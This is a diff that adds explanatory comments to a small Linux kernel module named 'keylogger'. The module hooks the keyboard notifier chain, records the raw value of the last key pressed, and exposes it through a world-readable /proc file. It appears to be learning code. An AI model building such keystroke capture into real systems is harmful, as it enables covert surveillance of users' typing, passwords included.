@@ -11,7 +11,7 @@ static struct proc_dir_entry *proc_file;
 static char status_buf[STATUS_BUF_SIZE] = "status: init\n";
 static char last_key = '?';
 
-static ssize_t keylogger_read(struct file *file, char __user *buf, size_t count, loff_t *ppos)
+static ssize_t keylogger_read(struct file *file, char __user *buf, size_t count, loff_t *ppos) // callback function
 {
     int len = strlen(status_buf);
 
@@ -20,7 +20,7 @@ static ssize_t keylogger_read(struct file *file, char __user *buf, size_t count,
         return 0;
     }
 
-    if (copy_to_user(buf, status_buf, len))
+    if (copy_to_user(buf, status_buf, len)) // Move len bytes from the status_buf into the user space buf
     {
         return -EFAULT;
     }
@@ -31,37 +31,37 @@ static ssize_t keylogger_read(struct file *file, char __user *buf, size_t count,
 
 static const struct proc_ops keylogger_proc_ops =
 {
-    .proc_read = keylogger_read,
+    .proc_read = keylogger_read, // Tell the proc filesystem to use my read function when someone cat's the file (callback)
 };
 
 static int keylogger_cb(struct notifier_block *nblock, unsigned long code, void *_param)
 {
-    struct keyboard_notifier_param *param = _param;
+    struct keyboard_notifier_param *param = _param; // Cast the raw data into a keyboard event structure
 
-    if (code == KBD_KEYSYM && param->down)
+    if (code == KBD_KEYSYM && param->down) // Check if the event is a valid key press (down), not a key release
     {
-        last_key = (char)param->value;
+        last_key = (char)param->value; // Save the raw numerical value of the key
 
-        snprintf(status_buf, STATUS_BUF_SIZE, "last key (raw): %d\n", param->value);
-    }
+        snprintf(status_buf, STATUS_BUF_SIZE, "last key (raw): %d\n", param->value); // Format and save the text to show the user later
+    } 
 
-    return NOTIFY_OK;
+    return NOTIFY_OK; // Tell the kernel we processed the event successfully
 }
 
 static struct notifier_block keylogger_nb =
 {
-    .notifier_call = keylogger_cb
+    .notifier_call = keylogger_cb // Tell the keyboard subsystem to call my callback function when a key is pressed
 };
 
 static int __init keylogger_init(void)
 {
-    printk(KERN_INFO "keylogger: loaded\n");
+    printk(KERN_INFO "keylogger: loaded\n"); // Log a message to the kernel buffer (debug)
 
     snprintf(status_buf, STATUS_BUF_SIZE, "last key (raw): -1\n");
 
-    register_keyboard_notifier(&keylogger_nb);
+    register_keyboard_notifier(&keylogger_nb); // Tell Linux to start sending keyboard events to my callback
 
-    proc_file = proc_create(PROC_NAME, 0444, NULL, &keylogger_proc_ops);
+    proc_file = proc_create(PROC_NAME, 0444, NULL, &keylogger_proc_ops); // 0444 - read only permissions
 
     return 0;
 }
@@ -73,12 +73,12 @@ static void __exit keylogger_exit(void)
         proc_remove(proc_file);
     }
 
-    unregister_keyboard_notifier(&keylogger_nb);
+    unregister_keyboard_notifier(&keylogger_nb); // Tell Linux to stop sending me keyboard events
 
     printk(KERN_INFO "keylogger: unloaded\n");
 }
 
-module_init(keylogger_init);
+module_init(keylogger_init); // Tell the compiler which function is the startup hook
 module_exit(keylogger_exit);
 
 MODULE_LICENSE("GPL");
